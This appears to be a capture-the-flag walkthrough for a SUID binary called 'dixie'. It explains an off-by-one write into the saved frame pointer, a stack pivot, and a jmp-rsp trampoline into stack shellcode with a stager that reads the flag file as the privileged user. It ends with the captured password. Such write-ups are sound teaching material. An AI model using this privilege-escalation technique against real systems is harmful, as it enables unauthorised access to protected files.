# level02 — walkthrough

**Binary:** `/home/level02/dixie` (SUID `flag02`, x86-64)
**Goal:** read `/home/flag02/.pass`

## 1. Recon
```
checksec: No canary, No PIE (0x400000), GNU_STACK = RWE (executable stack), ASLR off.
```
`store_record()`:
```c
char buf[BUF_SIZE];                 // 64 bytes, at rbp-0x40
in_len = 0;
while (in_len <= BUF_SIZE) {        // <=  -> loops 0..64 inclusive
    in_ch = read(0, &buf[in_len], 1);
    if (in_ch <= 0) break;
    in_len++;
}                                   // writes buf[64] : ONE byte too far
```
`main()` just does `store_record(); dump_records(); printf(... session ...);`.
The program never drops privilege, so its euid stays `flag02` the whole time.

## 2. The bug — a 1-byte frame-pointer overwrite
`buf` sits at `rbp-0x40`, and `buf` is `store_record`'s only local, so `buf[64]`
is exactly the **low byte of the saved RBP** — and that saved RBP is *main's*
frame pointer. So one extra byte bends main's RBP low byte.

When `store_record` returns, main runs with a corrupted RBP and later its own
epilogue does:
```
leave      ; rsp = corrupted_rbp ; pop rbp
ret        ; rip = [corrupted_rbp + 8]
```
main returns through a pointer whose low byte we chose. This is **not** a return
-address overwrite (we never reach `buf`'s return slot) — it is a frame-pointer
pivot.

## 3. Making `buf` reachable (the alignment trick)
`main_rbp = buf + 0x60`, and the 1-byte overwrite can only move `corrupted_rbp`
inside `main_rbp`'s 256-byte page. `buf` is only reachable from that page when
`buf & 0xff < 0xa0`. The stack position depends on the environment, so we run the
target with a fixed, tiny environment:
```
env -i PAD= ./dixie < payload
```
which puts `buf` at `...90`. Then the off-by-one byte **0xb8** makes
`corrupted_rbp + 8` land exactly on `buf[0x30]`.

> Debugging note: gdb drops the SUID bit, so measure the frame there
> (`break commit_record; p $rdi`), then reproduce the same env with
> `set exec-wrapper env -i PAD=`. The trace shows `ret -> jmp rsp -> buf[0x38]`.

## 4. Executing code on the (RWE) stack
The stack is executable, so we land shellcode in `buf` and use a trampoline:
```
buf[0x30] = &"jmp rsp"   (libc gadget @ 0x7ffff7c3f916)   ; main's ret goes here
buf[0x38] = eb c6        (jmp -0x38)                       ; jmp rsp lands here -> back to buf[0]
buf[0x00] = read()-stager: read stage-2 to rsp-0x400, jump to it
```
`buf` has room only for the small stager, so stage-2 (the file reader) is sent
right after the 65-byte overflow and pulled in by the stager.

## 5. stage-2 — read the flag as flag02
```
open("/home/flag02/.pass", O_RDONLY)
read(fd, stack, 0x50)
write(1, stack, n)
exit(0)
```
(SUID keeps euid = flag02, so the open succeeds.)

## 6. Run
```
python3 exploit.py > payload
env -i PAD= /home/level02/dixie < payload
-> qeplvibynup98phqb312dkvhtpdkklac
```

**flag02 = `qeplvibynup98phqb312dkvhtpdkklac`** (SSH password for level03)

## Gotcha that cost a lot of time
`dump_records()` prints `records[i].data` (the copied `buf`). On a *wrong* byte
the frame pivot simply re-enters main, and stage-2 gets read as the *next*
record and echoed back — so shellcode bytes containing `"PWN"`/markers appear in
the output and look like a successful run. Only **unforgeable** output (the file
contents, or a clean single-run `exit`) actually proves code execution.
